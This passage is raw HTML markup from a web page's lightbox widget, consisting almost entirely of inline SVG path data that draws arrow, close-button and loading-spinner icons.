0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195h10.391l-3.531-3.526q-0.193-0.193-0.193-0.474 0-0.286 0.19-0.477t0.477-0.19z"></path><path class="fbx-icon-arrows-1" d="M6 0l-3 3 5 5-5 5 3 3 8-8z"></path><path class="fbx-icon-arrows-2" d="M16 8l-16-7 3 7-3 7z"></path><path class="fbx-icon-arrows-3" d="M4 16l8-8-8-8 4 8z"></path><path class="fbx-icon-arrows-4" d="M6 12l4-4-4-4z"></path><path class="fbx-icon-arrows-5" d="M16 8l-8-8v5h-8l-0 6h8v5l8-8zM13.625 8.961l-0.25 0.25v-2.422l0.25 0.25v1.922zM13.875 7.289l0.25 0.25v0.922l-0.25 0.25v-1.422zM13.125 9.461l-0.25 0.25v-3.422l0.25 0.25v2.922zM12.625 9.961l-0.25 0.25v-4.422l0.25 0.25v3.922zM12.125 10.461l-0.25 0.25v-5.422l0.25 0.25v4.922zM11.625 10.961l-0.25 0.25v-6.422l0.25 0.25v5.922zM11.125 11.461l-0.25 0.25v-7.422l0.25 0.25v6.922zM10.625 11.961l-0.25 0.25v-8.422l0.25 0.25v7.922zM10.125 12.461l-0.25 0.25v-9.422l0.25 0.25v8.922zM9.625 12.961l-0.25 0.25v-10.422l0.25 0.25v9.922zM14.375 8.211v-0.422l0.211 0.211-0.211 0.211zM8.625 6v4h-0.25v-4h0.25zM8.125 6v4h-0.25v-4h0.25zM7.625 6v4h-0.25v-4h0.25zM7.125 6v4h-0.25v-4h0.25zM6.625 6v4h-0.25v-4h0.25zM6.125 6v4h-0.25v-4h0.25zM5.625 6v4h-0.25v-4h0.25zM5.125 6v4h-0.25v-4h0.25zM4.625 6v4h-0.25v-4h0.25zM4.125 6v4h-0.25v-4h0.25zM3.625 6v4h-0.25v-4h0.25zM3.125 6v4h-0.25v-4h0.25zM2.625 6v4h-0.25v-4h0.25zM2.125 6v4h-0.25v-4h0.25zM1.625 6v4h-0.25v-4h0.25zM1 6h0.125v4h-0.125l0-4zM9 10h-0.125v-4h0.125v-3.586l0.125 0.125v10.922l-0.125 0.125v-3.586z"></path><path class="fbx-icon-arrows-6" d="M16 8l-8-8v5h-8l-0 6h8v5z"></path><path class="fbx-icon-arrows-7" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM12.707 8.707l-4 4c-0.195 0.195-0.451 0.293-0.707 0.293s-0.512-0.098-0.707-0.293c-0.391-0.391-0.391-1.024 0-1.414l2.293-2.293h-5.586c-0.552 0-1-0.448-1-1s0.448-1 1-1h5.586l-2.293-2.293c-0.391-0.391-0.391-1.024 0-1.414s1.024-0.391 1.414 0l4 4c0.391 0.391 0.391 1.024 0 1.414z"></path><path class="fbx-icon-arrows-8" d="M16 16h-16v-16h16l-0 16zM2 2v12h12l0-12h-12zM9 11.5l3.5-3.5-3.5-3.5v2.5h-5v2h5v2.5z"></path><path class="fbx-icon-arrows-9" d="M0 5h1v6h-1zM2 5h1v6h-1zM4 5h1v6h-1zM16 8l-7-7v4h-3v6h3v4z"></path><path class="fbx-icon-arrows-10" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM9 11.5v-2.5h-5v-2h5v-2.5l3.5 3.5-3.5 3.5z"></path><path class="fbx-icon-arrows-11" d="M8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM8 14.5c-3.59 0-6.5-2.91-6.5-6.5s2.91-6.5 6.5-6.5 6.5 2.91 6.5 6.5-2.91 6.5-6.5 6.5zM12.707 7.293l-4-4c-0.39-0.391-1.024-0.391-1.414 0s-0.391 1.024 0 1.414l2.293 2.293h-5.586c-0.552 0-1 0.448-1 1s0.448 1 1 1h5.586l-2.293 2.293c-0.391 0.391-0.391 1.024 0 1.414 0.195 0.195 0.451 0.293 0.707 0.293s0.512-0.098 0.707-0.293l4-4c0.39-0.391 0.39-1.024 0-1.414z"></path></svg></button><button class="fbx-close fbx-btn-transition fbx-btn-shadow"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-close fbx-icon-default"><path class="fbx-icon-close-default" d="M13.405 11.404q0 0.357-0.25 0.607l-1.214 1.214q-0.25 0.25-0.607 0.25t-0.607-0.25l-2.625-2.625-2.625 2.625q-0.25 0.25-0.607 0.25t-0.607-0.25l-1.214-1.214q-0.25-0.25-0.25-0.607t0.25-0.607l2.625-2.625-2.625-2.625q-0.25-0.25-0.25-0.607t0.25-0.607l1.214-1.214q0.25-0.25 0.607-0.25t0.607 0.25l2.625 2.625 2.625-2.625q0.25-0.25 0.607-0.25t0.607 0.25l1.214 1.214q0.25 0.25 0.25 0.607t-0.25 0.607l-2.625 2.625 2.625 2.625q0.25 0.25 0.25 0.607z"></path><path class="fbx-icon-close-flat" d="M12.667 3q0.286 0 0.477 0.19t0.19 0.477q0 0.281-0.193 0.474l-4.198 4.193 4.198 4.193q0.193 0.193 0.193 0.474 0 0.286-0.19 0.477t-0.477 0.19q-0.281 0-0.474-0.193l-4.193-4.198-4.193 4.198q-0.193 0.193-0.474 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.281 0.193-0.474l4.198-4.193-4.198-4.193q-0.193-0.193-0.193-0.474 0-0.286 0.19-0.477t0.477-0.19q0.281 0 0.474 0.193l4.193 4.198 4.193-4.198q0.193-0.193 0.474-0.193z"></path></svg></button><button class="fbx-open-caption">…</button></div></div><div class="fbx-modal fbx-2 fbx-rounded fbx-light fbx-chrome fbx-no-count fbx-no-buttons fbx-desktop fbx-landscape" tabindex="0"><div class="fbx-inner-spacer"></div><div class="fbx-loader"><svg version="1.1" xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" class="fbx-icon fbx-icon-spinner fbx-icon-default"><path class="fbx-icon-spinner-default" d="M3 8c0-0.19 0.011-0.378 0.032-0.563l-2.89-0.939c-0.092 0.487-0.141 0.989-0.141 1.502 0 2.3 0.971 4.374 2.526 5.833l1.786-2.458c-0.814-0.889-1.312-2.074-1.312-3.375zM13 8c0 1.301-0.497 2.486-1.312 3.375l1.786 2.458c1.555-1.459 2.526-3.533 2.526-5.833 0-0.513-0.049-1.015-0.141-1.502l-2.89 0.939c0.021 0.185 0.032 0.373 0.032 0.563zM9 3.1c1.436 0.292 2.649 1.199 3.351 2.435l2.89-0.939c-1.144-2.428-3.473-4.188-6.241-4.534v3.038zM3.649 5.535c0.702-1.236 1.914-2.143 3.351-2.435v-3.038c-2.769 0.345-5.097 2.105-6.241 4.534l2.89 0.939zM10.071 12.552c-0.631 0.288-1.332 0.448-2.071 0.448s-1.44-0.16-2.071-0.448l-1.786 2.458c1.144 0.631 2.458 0.99 3.857 0.99s2.713-0.359 3.857-0.99l-1.786-2.458z"></path><path class="fbx-icon-spinner-flat" d="M10.833 10.495q0.271 0 0.469 0.198l1.885 1.885q0.198 0.198 0.198 0.474 0 0.271-0.198 0.469t-0.469 0.198q-0.276 0-0.474-0.198l-1.885-1.885q-0.193-0.193-0.193-0.474 0-0.276 0.195-0.471t0.471-0.195zM5.172 10.495q0.276 0 0.471 0.195t0.195 0.471-0.198 0.474l-1.885 1.885q-0.198 0.198-0.469 0.198-0.276 0-0.471-0.195t-0.195-0.471q0-0.281 0.193-0.474l1.885-1.885q0.198-0.198 0.474-0.198zM1.333 7.667h2.667q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-2.667q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195zM8 11.667q0.276 0 0.471 0.195t0.195 0.471v2.667q0 0.276-0.195 0.471t-0.471 0.195-0.471-0.195-0.195-0.471v-2.667q0-0.276 0.195-0.471t0.471-0.195zM3.286 2.948q0.271 0 0.469 0.198l1.885 1.885q0.198 0.198 0.198 0.469 0 0.276-0.195 0.471t-0.471 0.195q-0.281 0-0.474-0.193l-1.885-1.885q-0.193-0.193-0.193-0.474 0-0.276 0.195-0.471t0.471-0.195zM12 7.667h2.667q0.276 0 0.471 0.195t0.195 0.471-0.195 0.471-0.471 0.195h-2.667q-0.276 0-0.471-0.195t-0.195-0.471 0.195-0.471 0.471-0.195zM8 1q0.276 0 0.471 0.195t0.195 0.471v2.667q0 0.276-0.195 0.471t-0.471 0.195-0.471-0.195-0.195-0.471v-2.667q0-0.276 0.195-0.471t0.471-0.195zM12.719 2.948q0.271 0 0.469 0.198t0.198 0.469q0 0.276-0.198 0.474l-1.885 1.885q-0.193 0.193-0.469 0.193-0.286 0-0.477-0.19t-0.19-0.477q0-0.276 0.193-0.469l1.885-1.885q0.198-0.198 0.474-0.198z"></path><path class="fbx-icon-spinner-1" d="M5.569 12q0 0.536-0.379 0.911t-0.906 0.375q-0.536 0-0.911-0.375t-0.375-0.911 0.375-0.911 0.911-0.375q0.527 0 0.906 0.375t0.379 0.911zM9.426 13.714q0 0.473-0.335 0.808t-0.808 0.335-0.808-0.335-0.335-0.808 0.335-0.808 0.808-0.335 0.808 0.335 0.335 0.808zM3.857 8q0 0.589-0.42 1.009t-1.009 0.42-1.009-0.42-0.42-1.009 0.42-1.009 1.009-0.42 1.009 0.42 0.42 1.009zM13.283 12q0 0.411-0.295 0.705t-0.705 0.295-0.705-0.295-0.295-0.705 0.295-0.705 0.705-0.295 0.705 0.295 0.295 0.705zM5.854 4q0 0.652-0.46 1.112t-1.112 0.46-1.112-0.46-0.46-1.112 0.46-1.112 1.112-0.46 1.112 0.46 0.46 1.112zM9.997 2.286q0 0.714-0.5 1.214t-1.214 0.5-1.214-0.5-0.5-1.214 0.5-1.214 1.214-0.5 1.214 0.5 0.5 1.214zM14.844 8q0 0.357-0.25 0.607t-0.607 0.25-0.607-0.25-0.25-0.607 0.25-0.607 0.607-0.25 0.607 0.25 0.25 0.607zM12.997 4q0 0.295-0.21 0.504t-0.504 0.21-0.504-0.21-0.21-0.504 0.21-0.504 0.504-0.21 0.504 0.21 0.21 0.504z"></path><path class="fbx-icon-spinner-2" d="M16 8c-0.020-1.045-0.247-2.086-0.665-3.038-0.417-0.953-1.023-1.817-1.766-2.53s-1.624-1.278-2.578-1.651c-0.953-0.374-1.978-0.552-2.991-0.531-1.013 0.020-2.021 0.24-2.943 0.646-0.923 0.405-1.758 0.992-2.449 1.712s-1.237 1.574-1.597 2.497c-0.361 0.923-0.533 1.914-0.512 2.895 0.020 0.981 0.234 1.955 0.627 2.847 0.392 0.892 0.961 1.7 1.658 2.368s1.523 1.195 2.416 1.543c0.892 0.348 1.851 0.514 2.799 0.493 0.949-0.020 1.89-0.227 2.751-0.608 0.862-0.379 1.642-0.929 2.287-1.604s1.154-1.472 1.488-2.335c0.204-0.523 0.342-1.069 0.415-1.622 0.019 0.001 0.039 0.002 0.059 0.002 0.552 0 1-0.448 1-1 0-0.028-0.001-0.056-0.004-0.083h0.004zM14.411 10.655c-0.367 0.831-0.898 1.584-1.55 2.206s-1.422 1.112-2.254 1.434c-0.832 0.323-1.723 0.476-2.608 0.454-0.884-0.020-1.759-0.215-2.56-0.57-0.801-0.354-1.526-0.867-2.125-1.495s-1.071-1.371-1.38-2.173c-0.31-0.801-0.457-1.66-0.435-2.512s0.208-1.694 0.551-2.464c0.342-0.77 0.836-1.468 1.441-2.044s1.321-1.029 2.092-1.326c0.771-0.298 1.596-0.438 2.416-0.416s1.629 0.202 2.368 0.532c0.74 0.329 1.41 0.805 1.963 1.387s0.988 1.27 1.272 2.011c0.285 0.74 0.418 1.532 0.397 2.32h0.004c-0.002 0.027-0.004 0.055-0.004 0.083 0 0.516 0.39 0.94 0.892 0.994-0.097 0.544-0.258 1.075-0.481 1.578z"></path><path class="fbx-icon-spinner-3" d="M7 4c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM8 0c-4.418 0-8 3.582-8 8s3.582 8 8 8 8-3.582 8-8-3.582-8-8-8zM8 13c-0.552 0-1-0.448-1-1s0.448-1 1-1c0.552 0 1 0.448 1 1s-0.448 1-1 1zM8 8c-1.795 0-3.25 1.455-3.25 3.25s1.455 3.25 3.25 3.25c-3.59 0-6.5-2.91-6.5-6.5s2.91-6.5 6.5-6.5c1.795 0 3.25 1.455 3.25 3.25s-1.455 3.25-3.25 3.25z"></path><path class="fbx-icon-spinner-4" d="M6 2c0-1.105 0.895-2 2-2s2 0.895 2 2c0 1.105-0.895 2-2 2s-2-0.895-2-2zM10.243 3.757c0-1.105 0.895-2 2-2s2 0.895 2 2c0 1.105-0.895 2-2 2s-2-0.895-2-2zM13 8c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM11.243 12.243c0-0.552 0.448-1 1-1s1 0.448 1 1c0 0.552-0.448 1-1 1s-1-0.448-1-1zM7 14c0 0 0 0 0 0 0-0.552 0.448-1 1-1s1 0.448 1 1c0 0 0 0 0 0 0 0.552-0.448 1-1 1s-1-0.448-1-1zM2.757 12.243c0 0 0 0 0 0 0-0.552 0.448-1 1-1s1 0.448 1 1c0 0 0 0 0 0 0 0.552-0.448 1-1 1s-1-0.448-1-1zM2.257 3.757c0 0 0 0 0 0 0-0.828 0.672-1.5 1.5-1.5s1.5 0.672 1.5 1.5c0 0 0 0 0 0 0 0.828-0.672 1.5-1.5 1.5s-1.5-0.672-1.5-1.5zM0.875 8c0-0.621 0.504-1.125 1.125-1.125s1.125 0.504 1.125 1.125c0 0.621-0.504 1.125-1.125 1.125s-1.125-0.504-1.125-1.125z"></path><path class="fbx-icon-spinner-5" d="M8 0c-4.355 0-7.898 3.481-7.998 7.812 0.092-3.779 2.966-6.812 6.498-6.812 3.59 0 6.5 3.134 6.5 7 0 0.828 0.672 1.5 1.5 1.5s1.5-0.672 1.5-1.5c0-4.418-3.582-8-8-8zM8 16c4.355 0 7.898-3.481 7.998-7.812-0.092 3.779-2.966 6.812-6.498 6.812-3.59 0-6.5-3.134-6.5-7 0-0.828-0.672-1.5-1.5-1.5s-1.5 0.672-1.5 1.5c0 4.418 3.582 8 8 8z"></path><path class="fbx-icon-spinner-6" d="M0.001 8.025l-0 0c0 0 0 0.001 0 0.003 0.002 0.061 0.009 0.12 0.021 0.177 0.003 0.027 0.007 0.057 0.011 0.090 0.003 0.029 0.007 0.061 0.011 0.095 0.006 0.040 0.012 0.083 0.019 0.128 0.013 0.090 0.028 0.189 0.045 0.296 0.021 0.101 0.044 0.21 0.068 0.326 0.011 0.058 0.028 0.117 0.044 0.178s0.032 0.123 0.049 0.188c0.009 0.032 0.016 0.065 0.027 0.097s0.021 0.065 0.031 0.098 0.043 0.134 0.065 0.203c0.006 0.017 0.011 0.035 0.017 0.052s0.013 0.034 0.019 0.052 0.026 0.070 0.039 0.105c0.027 0.070 0.053 0.142 0.081 0.215 0.031 0.071 0.062 0.144 0.094 0.218 0.016 0.037 0.032 0.074 0.048 0.111s0.035 0.073 0.053 0.111 0.073 0.148 0.11 0.224c0.039 0.075 0.081 0.149 0.123 0.224 0.021 0.037 0.042 0.075 0.063 0.113s0.045 0.074 0.068 0.112 0.093 0.149 0.14 0.224c0.198 0.295 0.417 0.587 0.66 0.864 0.245 0.275 0.511 0.535 0.792 0.775 0.284 0.236 0.582 0.452 0.886 0.642 0.306 0.188 0.619 0.349 0.928 0.487 0.078 0.032 0.156 0.063 0.232 0.095 0.038 0.015 0.076 0.032 0.115 0.046s0.077 0.027 0.115 0.041 0.151 0.054 0.226 0.078c0.075 0.022 0.15 0.044 0.224 0.066 0.037 0.011 0.073 0.022 0.109 0.031s0.073 0.018 0.109 0.027 0.143 0.035 0.213 0.052c0.070 0.014 0.139 0.027 0.207 0.040 0.034 0.006 0.067 0.013 0.101 0.019 0.017 0.003 0.033 0.006 0.049 0.009s0.033 0.005 0.049 0.007c0.066 0.009 0.13 0.018 0.192 0.027 0.031 0.004 0.062 0.009 0.093 0.013s0.061 0.006 0.091 0.009 0.118 0.010 0.174 0.015c0.056 0.005 0.111 0.011 0.164 0.012 0.004 0 0.007 0 0.011 0 0.010 0.544 0.453 0.982 1 0.982 0.008 0 0.017-0 0.025-0.001v0c0 0 0.001-0 0.004-0 0.061-0.002 0.12-0.009 0.177-0.021 0.027-0.003 0.057-0.007 0.090-0.011 0.029-0.003 0.061-0.007 0.095-0.011 0.040-0.006 0.083-0.012 0.128-0.019 0.090-0.013 0.189-0.028 0.296-0.045 0.101-0.021 0.21-0.044 0.326-0.068 0.058-0.011 0.117-0.028 0.178-0.044s0.123-0.033 0.188-0.049c0.032-0.009 0.065-0.016 0.097-0.027s0.065-0.021 0.098-0.031 0.134-0.043 0.203-0.065c0.017-0.006 0.035-0.011 0.052-0.017s0.034-0.013 0.052-0.019 0.070-0.026 0.105-0.039c0.070-0.027 0.142-0.053 0.215-0.081 0.071-0.031 0.144-0.062 0.218-0.094 0.037-0.016 0.074-0.032 0.111-0.048s0.073-0.035 0.111-0.053 0.148-0.073 0.224-0.11c0.075-0.039 0.149-0.081 0.224-0.123 0.037-0.021 0.075-0.042 0.113-0.063s0.074-0.045 0.112-0.068 0.149-0.093 0.224-0.14c0.295-0.197 0.587-0.417 0.864-0.66 0.275-0.245 0.535-0.511 0.775-0.792 0.236-0.284 0.452-0.582 0.642-0.886 0.188-0.306 0.349-0.619 0.487-0.928 0.032-0.078 0.063-0.156 0.095-0.232 0.015-0.038 0.032-0.076 0.046-0.115s0.027-0.077 0.040-0.115 0.054-0.151 0.078-0.226c0.022-0.075 0.044-0.15 0.066-0.224 0.011-0.037 0.022-0.073 0.031-0.109s0.018-0.073 0.027-0.109 0.035-0.143 0.052-0.213c0.014-0.070 0.027-0.139 0.040-0.207 0.006-0.034 0.013-0.067 0.019-0.101 0.003-0.017 0.006-0.033 0.009-0.049s0.005-0.033 0.007-0.050c0.009-0.065 0.018-0.13 0.027-0.192 0.004-0.031 0.009-0.062 0.013-0.093s0.006-0.061 0.009-0.091 0.010-0.118 0.015-0.174c0.005-0.056 0.011-0.111 0.012-0.165 0-0.008 0.001-0.016 0.001-0.025 0.55-0.002 0.996-0.449 0.996-1 0-0.008-0-0.017-0.001-0.025h0c0 0-0-0.001-0-0.003-0.002-0.061-0.009-0.12-0.021-0.177-0.003-0.027-0.007-0.057-0.011-0.090-0.003-0.029-0.007-0.061-0.011-0.095-0.006-0.040-0.012-0.083-0.019-0.128-0.013-0.090-0.028-0.189-0.045-0.296-0.021-0.101-0.044-0.21-0.068-0.326-0.011-0.058-0.028-0.117-0.044-0.178s-0.032-0.123-0.049-0.188c-0.009-0.032-0.016-0.065-0.027-0.097s-0.021-0.065-0.031-0.098-0.043-0.134-0.065-0.203c-0.005-0.017-0.011-0.035-0.017-0.052s-0.013-0.034-0.019-0.052-0.026-0.070-0.039-0.105c-0.027-0.070-0.053-0.142-0.081-0.215-0.031-0.071-0.062-0.144-0.094-0.218-0.016-0.037-0.032-0.074-0.048-0.111s-0.035-0.073-0.053-0.111-0.073-0.148-0.11-0.224c-0.039-0.075-0.081-0.149-0.123-0.224-0.021-0.037-0.042-0.075-0.063-0.113s-0.045-0.074-0.068-0.112-0.093-0.149-0.14-0.224c-0.197-0.295-0.417-0.587-0.66-0.864-0.245-0.275-0.511-0.535-0.792-0.775-0.284-0.236-0.582-0.452-0.886-0.642-0.306-0.188-0.619-0.349-0.928-0.487-0.078-0.032-0.156-0.063-0.232-0.095-0.038-0.015-0.076-0.032-0.115-0.046s-0.077-0.027-0.115-0.040-0.151-0.054-0.226-0.078c-0.075-0.022-0.15-0.044-0.224-0.066-0.037-0.010-0.073-0.022-0.109-0.031s-0.073-0.018-0.109-0.027-0.143-0.035-0.213-0.052c-0.070-0.014-0.139-0.027-0.207-0.040-0.034-0.006-0.067-0.013-0.101-0.019-0.017-0.003-0.033-0.006-0.049-0.009s-0.033-0.005-0.049-0.007c-0.066-0.009-0.13-0.018-0.192-0.027-0.031-0.004-0.062-0.009-0.093-0.013s-0.061-0.006-0.091-0.009-0.118-0.010-0.174-0.015c-0.056-0.005-0.111-0.011-0.164-0.012-0.013-0-0.026-0.001-0.039-0.001-0.010-0.543-0.454-0.981-0.999-0.981-0.008 0-0.017 0-0.025 0.001l-0-0c0 0-0.001 0-0.003 0-0.061 0.002-0.12 0.009-0.177 0.021-0.027 0.003-0.057 0.007-0.090 0.011-0.029 0.003-0.061 0.007-0.095 0.011-0.040 0.006-0.083 0.012-0.128 0.019-0.090 0.013-0.189 0.028-0.296 0.045-0.101 0.021-0.21 0.044-0.326 0.068-0.058 0.011-0.117 0.028-0.178 0.044s-0.123 0.033-0.188 0.049c-0.032 0.009-0.065 0.016-0.097 0.027s-0.065 0.021-0.098 0.031-0.134 0.043-0.203 0.065c-0.017 0.006-0.035 0.011-0.052 0.017s-0.034 0.013-0.052 0.019-0.070 0.026-0.105 0.039c-0.070 0.027-0.142 0.053-0.215 0.081-0.071 0.031-0.144 0.062-0.218 0.094-0.037 0.016-0.074 0.032-0.111 0.048s-0.073 0.035-0.111 0.053-0.148 0.073-0.224 0.11c-0.075 0.039-0.149 0.081-0.224 0.123-0.037 0.021-0.075 0.042-0.113 0.063s-0.074 0.045-0.112 0.068-0.149 0.093-0.224 0.14c-0.295 0.198-0.587 0.417-0.864 0.66-0.275 0.245-0.535 0.511-0.775 0.792-0.236 0.284-0.452 0.582-0.642 0.886-0.188 0.306-0.349 0.619-0.487 0.928-0.032 0.078-0.063 0.156-0.095 0.232-0.015 0.038-0.032 0.076-0.046 0.115s-0.027 0.077-0.040 0.115-0.054 0.151-0.078 0.226c-0.022 0.075-0.044 0.15-0.066 0.224-0.011 0.037-0.022 0.073-0.032 0.109s-0.018 0.073-0.027 0.109-0.035 0.143-0.052 0.213c-0.014 0.070-0.027 0.139-0.040 0.207-0.006 0.034-0.013 0.067-0.019 0.101-0.003 0.017-0.006 0.033-0.009 0.049s-0.005 0.033-0.007 0.050c-0.009 0.065-0.018 0.13-0.027 0.192-0.004 0.031-0.009 0.062-0.013 0.093s-0.006 0.061-0.009 0.091-0.010 0.118-0.015 0.174c-0.005 0.056-0.011 0.111-0.012 0.165-0 0.009-0.001 0.017-0.001 0.025-0.537 0.017-0.967 0.458-0.967 0.999 0 0.008 0 0.017 0.001 0.025zM1.149 7.011c0.001-0.003 0.001-0.006 0.002-0.009 0.010-0.051 0.026-0.102 0.040-0.155s0.030-0.107 0.045-0.163c0.008-0.028 0.015-0.056 0.024-0.084s0.019-0.057 0.028-0.086 0.038-0.116 0.058-0.176c0.005-0.015 0.010-0.030 0.015-0.045s0.012-0.030 0.017-0.045 0.023-0.060 0.035-0.091 0.048-0.123 0.073-0.186c0.028-0.062 0.056-0.125 0.084-0.189 0.014-0.032 0.028-0.064 0.043-0.096s0.032-0.064 0.048-0.096 0.065-0.128 0.098-0.194c0.034-0.065 0.073-0.128 0.109-0.194 0.018-0.032 0.037-0.065 0.056-0.098s0.040-0.064 0.061-0.096c0.041-0.064 0.082-0.129 0.124-0.194 0.176-0.255 0.369-0.506 0.583-0.744 0.217-0.236 0.451-0.459 0.697-0.665 0.25-0.202 0.511-0.385 0.776-0.547 0.268-0.159 0.541-0.294 0.808-0.41 0.068-0.027 0.135-0.053 0.202-0.079 0.033-0.013 0.066-0.027 0.099-0.038s0.067-0.022 0.1-0.033 0.131-0.045 0.196-0.065c0.065-0.018 0.13-0.036 0.194-0.054 0.032-0.009 0.063-0.019 0.095-0.026s0.063-0.014 0.094-0.021 0.123-0.028 0.184-0.042c0.061-0.011 0.12-0.021 0.179-0.032 0.029-0.005 0.058-0.010 0.087-0.015 0.014-0.003 0.029-0.005 0.043-0.008s0.029-0.003 0.043-0.005c0.056-0.007 0.112-0.014 0.166-0.020 0.027-0.003 0.053-0.007 0.080-0.010s0.053-0.004 0.078-0.006 0.102-0.007 0.15-0.011c0.049-0.003 0.095-0.008 0.142-0.008 0.091-0.002 0.177-0.004 0.256-0.006 0.073 0.003 0.14 0.005 0.2 0.007 0.030 0.001 0.058 0.002 0.085 0.002 0.033 0.002 0.064 0.004 0.093 0.006 0.033 0.002 0.063 0.004 0.091 0.006 0.051 0.008 0.103 0.012 0.156 0.012 0.007 0 0.015-0 0.022-0.001 0.002 0 0.004 0 0.004 0v-0c0.487-0.012 0.887-0.372 0.962-0.84 0.008 0.002 0.017 0.004 0.025 0.006 0.051 0.010 0.102 0.026 0.155 0.040s0.107 0.030 0.163 0.045c0.028 0.008 0.056 0.015 0.084 0.024s0.057 0.019 0.086 0.028 0.116 0.038 0.176 0.058c0.015 0.005 0.030 0.010 0.045 0.015s0.030 0.012 0.045 0.017 0.060 0.023 0.091 0.035 0.123 0.048 0.186 0.073c0.062 0.028 0.125 0.056 0.189 0.084 0.032 0.014 0.064 0.028 0.096 0.043s0.064 0.032 0.096 0.048 0.128 0.065 0.194 0.098c0.065 0.034 0.129 0.073 0.194 0.109 0.032 0.018 0.065 0.037 0.098 0.056s0.064 0.040 0.096 0.061 0.129 0.082 0.194 0.124c0.255 0.176 0.506 0.369 0.744 0.583 0.236 0.217 0.459 0.451 0.665 0.697 0.202 0.25 0.385 0.511 0.547 0.776 0.159 0.268 0.294 0.541 0.41 0.808 0.027 0.068 0.053 0.135 0.079 0.202 0.013 0.033 0.027 0.066 0.038 0.099s0.022 0.067 0.033 0.1 0.045 0.131 0.065 0.196c0.018 0.065 0.036 0.13 0.054 0.194 0.009 0.032 0.019 0.063 0.026 0.095s0.014 0.063 0.021 0.094 0.028 0.123 0.042 0.184c0.011 0.061 0.021 0.12 0.032 0.179 0.005 0.029 0.010 0.058 0.015 0.087 0.003 0.014 0.005 0.029 0.008 0.043s0.003 0.029 0.005 0.043c0.007 0.056 0.014 0.112 0.020 0.166 0.003 0.027 0.007 0.053 0.010 0.080s0.004 0.053 0.006 0.078 0.007 0.102 0.011 0.15c0.003 0.049 0.008 0.095 0.008 0.142 0.002 0.091 0.004 0.177 0.006 0.256-0.003 0.073-0.005 0.14-0.007 0.2-0.001 0.030-0.002 0.058-0.002 0.085-0.002 0.033-0.004 0.064-0.006 0.093-0.002 0.033-0.004 0.063-0.006 0.091-0.008 0.051-0.012 0.103-0.012 0.156 0 0.007 0 0.015 0.001 0.022-0 0.002-0 0.004-0 0.004h0c0.012 0.481 0.363 0.877 0.823 0.959-0.001 0.005-0.002 0.009-0.003 0.014-0.010 0.051-0.025 0.102-0.040 0.155s-0.030 0.107-0.045 0.163c-0.008 0.028-0.015 0.056-0.024 0.084s-0.019 0.057-0.028 0.086-0.039 0.116-0.058 0.176c-0.005 0.015-0.010 0.030-0.015 0.045s-0.012 0.030-0.017 0.045-0.023 0.060-0.035 0.091-0.048 0.123-0.073 0.186c-0.028 0.062-0.056 0.125-0.084 0.189-0.014 0.032-0.028 0.064-0.043 0.096s-0.032 0.064-0.048 0.096-0.065 0.128-0.098 0.194c-0.034 0.065-0.073 0.129-0.109 0.194-0.018 0.032-0.037 0.065-0.056 0.098s-0.040 0.064-0.061 0.096-0.082 0.129-0.124 0.194c-0.176 0.255-0.369 0.506-0.583 0.744-0.217 0.236-0.451 0.459-0.697 0.665-0.25 0.202-0.511 0.385-0.776 0.547-0.268 0.159-0.541 0.294-0.808 0.41-0.068 0.027-0.135 0.053-0.202 0.079-0.033 0.013-0.066 0.027-0.099 0.038s-0.067 0.022-0.1 0.033-0.131 0.045-0.196 0.065c-0.065 0.018-0.13 0.036-0.194 0.054-0.032 0.009-0.063 0.019-0.095 0.026s-0.063 0.014-0.094 0.021-0.123 0.028-0.184 0.042c-0.061 0.011-0.12 0.021-0.179 0.032-0.029 0.005-0.058 0.010-0.087 0.015-0.014 0.003-0.028 0.005-0.043 0.008s-0.029 0.003-0.043 0.005c-0.056 0.007-0.112 0.014-0.166 0.020-0.027 0.003-0.053 0.007-0.080 0.010s-0.053 0.004-0.078 0.006-0.102 0.007-0.15 0.011c-0.049 0.003-0.095 0.008-0.142 0.008-0.091 0.002-0.177 0.004-0.256 0.006-0.073-0.003-0.14-0.005-0.2-0.007-0.030-0.001-0.058-0.002-0.085-0.002-0.033-0.002-0.064-0.004-0.093-0.006-0.033-0.002-0.063-0.004-0.091-0.006-0.051-0.008-0.103-0.012-0.156-0.012-0.007 0-0.015 0-0.022 0.001-0.002-0-0.003-0-0.003-0v0c-0.484 0.012-0.883 0.369-0.961 0.834-0.050-0.010-0.101-0.025-0.153-0.039s-0.107-0.030-0.163-0.045c-0.028-0.008-0.056-0.015-0.084-0.024s-0.057-0.019-0.086-0.028-0.116-0.039-0.176-0.058c-0.015-0.005-0.030-0.010-0.045-0.015s-0.030-0.012-0.045-0.017-0.060-0.023-0.091-0.035-0.123-0.048-0.186-0.073c-0.062-0.028-0.125-0.056-0.189-0.084-0.032-0.014-0.064-0.028-0.096-0.043s-0.064-0.032-0.096-0.048-0.128-0.065-0.194-0.098c-0.065-0.034-0.129-0.073-0.194-0.109-0.032-0.018-0.065-0.037-0.098-0.056s-0.064-0.040-0.096-0.061c-0.064-0.041-0.129-0.082-0.194-0.124-0.255-0.175-0.506-0.369-0.744-0.583-0.236-0.217-0.459-0.451-0.665-0.697-0.202-0.25-0.385-0.511-0.547-0.776-0.159-0.268-0.294-0.541-0.41-0.808-0.027-0.068-0.053-0.135-0.079-0.202-0.013-0.033-0.027-0.066-0.038-0.099s-0.022-0.067-0.033-0.1-0.045-0.131-0.065-0.196c-0.018-0.065-0.036-0.13-0.054-0.194-0.009-0.032-0.019-0.063-0.026-0.095s-0.014-0.063-0.021-0.094-0.028-0.123-0.042-0.184c-0.011-0.061-0.021-0.12-0.032-0.179-0.005-0.029-0.010-0.058-0.015-0.087-0.003-0.014-0.005-0.028-0.008-0.043s-0.003-0.029-0.005-0.043c-0.007-0.05